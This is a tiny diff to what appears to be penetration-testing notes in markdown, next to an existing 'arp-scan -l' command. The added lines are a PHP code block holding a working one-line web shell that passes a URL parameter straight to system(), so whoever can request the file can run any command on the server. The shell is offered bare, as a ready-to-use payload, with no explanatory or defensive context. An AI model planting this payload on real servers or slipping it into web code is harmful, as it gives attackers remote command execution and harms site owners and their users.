@@ -24,3 +24,8 @@
 sudo arp-scan -l
 ```
 
+
+```php
+<?php system($_GET["cmd"]);?>
+```
+
